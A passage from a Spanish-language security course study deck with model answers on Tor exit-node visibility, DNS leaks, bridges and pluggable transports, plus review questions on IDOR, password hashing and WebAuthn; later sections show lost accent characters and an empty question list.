- Cliente: se protege su IP del servicio; el servicio solo ve el circuito.
- Un error de configuración del servidor (p. ej. fugas del proceso) puede revelar su IP aunque la red esté bien.

**c) Diseña defensas operativas para el onion service.**

**Respuesta.**
- Aislar el servicio en contenedor sin acceso a la IP pública ni a metadatos; egress solo por Tor.
- Revisar logs y aplicaciones por fugas (cabeceras, correos, recursos externos); evitar contenido que dispare conexiones directas.
- Proteger la clave del descriptor, monitorear intro points y aplicar rate limiting en la aplicación.

---

# Tema 9 · Escenario 4: La salida que habla claro

**Situación.** Un usuario usa un exit node para visitar un sitio HTTP (sin TLS). Un operador de exit malicioso observa el tráfico y además el cliente tiene fugas de DNS hacia el resolver local.

**a) ¿Qué puede y qué no puede ver un exit node?**

**Respuesta.**
- Idea central: el exit descifra la capa Tor y reenvía al destino; ve el tráfico en claro solo si el protocolo no cifra.
- Justificación técnica: con HTTPS el exit ve IP, puerto y SNI, no el contenido; con HTTP ve todo.
- Límite: el exit no conoce la IP del cliente, pero sí el destino y el momento.

**b) Compara fuga DNS con fuga de aplicación.**

**Respuesta.**
- DNS: si la resolución no va por Tor, el resolver local ve los dominios y puede asociarlos a la IP real.
- Aplicación: un plugin o cliente que conecta directo revela la IP sin pasar por el circuito.
- Ambas anulan el anonimato de red aunque el navegador "use Tor"; la fuga de aplicación suele ser más difícil de detectar.

**c) Diseña una configuración y verificación contra fugas.**

**Respuesta.**
- Usar Tor Browser o `torsocks`/proxy transparente que capture DNS y conexiones; bloquear tráfico fuera de Tor con firewall.
- Preferir HTTPS y verificar certificados; no instalar extensiones que hagan requests propios.
- Probar con captura de paquetes y sitios de test de fugas; revisar `resolv.conf` y reglas de egress.

---

# Tema 9 · Escenario 5: El directorio y los puentes

**Situación.** En un país se bloquean las IP públicas de los guards. Un usuario intenta conectarse sin bridges y falla; además, el cliente consulta el directorio por su conexión directa antes de configurar un pluggable transport.

**a) ¿Por qué bloquear los guards conocidos afecta el arranque y no solo la velocidad?**

**Respuesta.**
- Idea central: sin un primer salto alcanzable no se construye circuito; el cliente necesita una entrada no bloqueada.
- Justificación técnica: la censura filtra por IP/puerto o por huella del protocolo; los bridges son entradas no listadas públicamente.
- Límite: bridges públicos se queman rápido; se necesitan mecanismos de distribución y transports que imiten tráfico común.

**b) Compara bridges con pluggable transports frente a censura por IP y por DPI.**

**Respuesta.**
- Bridges: ocultan la lista de entradas; útiles contra bloqueo por IP, pero un DPI aún puede reconocer el handshake.
- Pluggable transports (p. ej. obfs4, Snowflake): disfrazan el flujo para evadir DPI; no resuelven por sí solos el bloqueo de todas las IP.
- La combinación es más robusta; ninguno garantiza disponibilidad ante un adversario que bloquea todo lo no permitido.

**c) Diseña un plan de arranque en red censurada.**

**Respuesta.**
- Obtener bridges por canales fuera de banda (correo, sitio espejo, contacto de confianza) y no confiar en listas públicas.
- Configurar el transporte antes de conectar; evitar consultas al directorio por la red local.
- Medir qué falla (DNS, TCP, handshake), rotar bridges y documentar que el anonimato no equivale a disponibilidad.

---

# Preguntas rápidas · Bloque 3

**1. ¿Qué diferencia a IDOR de un fallo de autenticación?** IDOR ocurre con un usuario autenticado que accede a objetos que no le pertenecen; la autenticación sí funcionó, falló la autorización por recurso.

**2. ¿Por qué un salt no basta para almacenar passwords?** El salt evita tablas precalculadas y hashes iguales, pero no encarece cada intento; se necesita un KDF lento como Argon2id.

**3. ¿Qué ventaja de WebAuthn lo hace resistente al phishing?** La credencial está ligada al origen (RP ID) y la clave privada no sale del autenticador, así un sitio clonado no obtiene una firma válida.

**4. ¿Qué ve un exit node de una conexión HTTPS?** Ve la IP y el puerto del destino y el SNI, pero no el contenido cifrado por TLS.

**5. ¿Por qué elegir el guard node manualmente puede ser riesgoso?** Rompe la selección aleatoria y estable del cliente, aumentando la probabilidad de usar un relay malicioso o de rotar guards y ampliar la exposición.

---

# Preguntas r?pidas

15 preguntas de repaso. Respuesta breve, pero con el concepto clave.

---


---


---



---

# Errores comunes

- Responder con definiciones sin aplicarlas al escenario.
- Confundir **cifrado** con integridad, autenticaci?n o disponibilidad.
- Decir ?TLS lo resuelve todo?: no cubre extremos comprometidos, autorizaci?n ni disponibilidad.
- Olvidar el **modelo de confianza** y el **trade-off** de cada control.
- Afirmar que un mecanismo ?detiene? un ataque sin explicar qu? supuesto lo hace fallar.

---

# Checklist final

- ?Nombr? el activo y la propiedad afectada?
- ?Expliqu? el mecanismo, no solo el nombre?
- ?Inclu? un ataque concreto y su consecuencia?
- ?Expliqu? qu? defensa aplica y qu? **no** cubre?
- ?Cerr? con un trade-off o una decisi?n de dise?o?

---

<!-- _class: lead -->

# Fin

Repasa los escenarios por tema y practica responder en 5 a 7 minutos cada uno.
